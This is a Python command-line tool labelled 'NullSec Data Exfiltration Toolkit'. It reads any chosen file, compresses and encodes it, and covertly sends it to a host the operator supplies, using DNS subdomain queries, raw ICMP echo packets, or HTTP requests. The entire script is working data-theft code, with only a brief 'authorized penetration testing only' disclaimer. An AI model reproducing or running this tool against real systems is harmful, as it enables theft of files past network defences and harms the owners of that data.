#!/usr/bin/env python3
"""
NullSec Data Exfiltration Toolkit
Covert data transfer methods for red team operations
Author: bad-antics | GitHub: bad-antics | Discord: discord.gg/killers

WARNING: For authorized penetration testing only!
"""

import argparse
import base64
import hashlib
import os
import socket
import struct
import sys
import time
import zlib
from typing import Optional

BANNER = """
╔═══════════════════════════════════════════════════════════╗
║     ███╗   ██╗██╗   ██╗██╗     ██╗     ███████╗███████╗   ║
║     ████╗  ██║██║   ██║██║     ██║     ██╔════╝██╔════╝   ║
║     ██╔██╗ ██║██║   ██║██║     ██║     ███████╗█████╗     ║
║     ██║╚██╗██║██║   ██║██║     ██║     ╚════██║██╔══╝     ║
║     ██║ ╚████║╚██████╔╝███████╗███████╗███████║███████╗   ║
║     ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝   ║
║               DATA EXFILTRATION TOOLKIT                    ║
║            bad-antics | bad-antics | discord.gg/killers  ║
╚═══════════════════════════════════════════════════════════╝
"""

class DNSExfil:
    """DNS-based data exfiltration"""
    
    def __init__(self, domain: str, chunk_size: int = 30):
        self.domain = domain
        self.chunk_size = chunk_size
    
    def encode_data(self, data: bytes) -> list:
        """Encode data as DNS-safe chunks"""
        compressed = zlib.compress(data)
        encoded = base64.b32encode(compressed).decode().lower().rstrip('=')
        chunks = [encoded[i:i+self.chunk_size] for i in range(0, len(encoded), self.chunk_size)]
        return chunks
    
    def exfiltrate(self, data: bytes):
        """Send data via DNS queries"""
        chunks = self.encode_data(data)
        total = len(chunks)
        
        print(f"[*] Exfiltrating {len(data)} bytes in {total} DNS queries")
        
        for i, chunk in enumerate(chunks):
            subdomain = f"{i:04d}.{chunk}.{self.domain}"
            try:
                socket.gethostbyname(subdomain)
            except socket.gaierror:
                pass  # Expected - we just want to send the query
            
            if (i + 1) % 10 == 0:
                print(f"[*] Progress: {i+1}/{total} queries")
            time.sleep(0.1)  # Rate limiting
        
        print(f"[+] Exfiltration complete")


class ICMPExfil:
    """ICMP-based data exfiltration (requires root)"""
    
    def __init__(self, target: str, chunk_size: int = 48):
        self.target = target
        self.chunk_size = chunk_size
    
    def create_icmp_packet(self, data: bytes, seq: int) -> bytes:
        """Create ICMP echo request packet"""
        icmp_type = 8  # Echo request
        icmp_code = 0
        checksum = 0
        identifier = os.getpid() & 0xFFFF
        
        # Create header with zero checksum
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, seq)
        
        # Calculate checksum
        packet = header + data
        checksum = self._checksum(packet)
        
        # Recreate header with correct checksum
        header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, seq)
        return header + data
    
    def _checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        total = 0
        for i in range(0, len(data), 2):
            total += (data[i] << 8) + data[i+1]
        
        total = (total >> 16) + (total & 0xFFFF)
        total += total >> 16
        return ~total & 0xFFFF
    
    def exfiltrate(self, data: bytes):
        """Send data via ICMP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print("[-] ICMP exfiltration requires root privileges")
            return
        
        compressed = zlib.compress(data)
        chunks = [compressed[i:i+self.chunk_size] for i in range(0, len(compressed), self.chunk_size)]
        
        print(f"[*] Exfiltrating {len(data)} bytes in {len(chunks)} ICMP packets")
        
        for i, chunk in enumerate(chunks):
            packet = self.create_icmp_packet(chunk, i)
            sock.sendto(packet, (self.target, 0))
            time.sleep(0.05)
        
        sock.close()
        print(f"[+] Exfiltration complete")


class HTTPExfil:
    """HTTP-based data exfiltration"""
    
    def __init__(self, url: str, method: str = 'POST'):
        self.url = url
        self.method = method
    
    def exfiltrate(self, data: bytes):
        """Send data via HTTP"""
        import urllib.request
        import urllib.parse
        
        compressed = zlib.compress(data)
        encoded = base64.b64encode(compressed).decode()
        
        print(f"[*] Exfiltrating {len(data)} bytes via HTTP {self.method}")
        
        if self.method == 'POST':
            req = urllib.request.Request(
                self.url,
                data=encoded.encode(),
                headers={'Content-Type': 'application/octet-stream'}
            )
        else:
            # GET - encode in URL parameter
            params = urllib.parse.urlencode({'d': encoded})
            req = urllib.request.Request(f"{self.url}?{params}")
        
        try:
            urllib.request.urlopen(req, timeout=30)
            print(f"[+] Exfiltration complete")
        except Exception as e:
            print(f"[-] HTTP exfiltration failed: {e}")


def read_file(path: str) -> Optional[bytes]:
    """Read file contents"""
    try:
        with open(path, 'rb') as f:
            return f.read()
    except Exception as e:
        print(f"[-] Failed to read file: {e}")
        return None


def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description='NullSec Data Exfiltration Toolkit')
    parser.add_argument('file', help='File to exfiltrate')
    parser.add_argument('-m', '--method', choices=['dns', 'icmp', 'http'], 
                        default='dns', help='Exfiltration method')
    parser.add_argument('-t', '--target', required=True, 
                        help='Target (domain for DNS, IP for ICMP, URL for HTTP)')
    parser.add_argument('-c', '--chunk-size', type=int, default=30,
                        help='Chunk size for data splitting')
    
    args = parser.parse_args()
    
    data = read_file(args.file)
    if not data:
        sys.exit(1)
    
    print(f"[*] File: {args.file}")
    print(f"[*] Size: {len(data)} bytes")
    print(f"[*] Method: {args.method.upper()}")
    print(f"[*] Target: {args.target}")
    print()
    
    if args.method == 'dns':
        exfil = DNSExfil(args.target, args.chunk_size)
    elif args.method == 'icmp':
        exfil = ICMPExfil(args.target, args.chunk_size)
    else:
        exfil = HTTPExfil(args.target)
    
    exfil.exfiltrate(data)


if __name__ == '__main__':
    main()
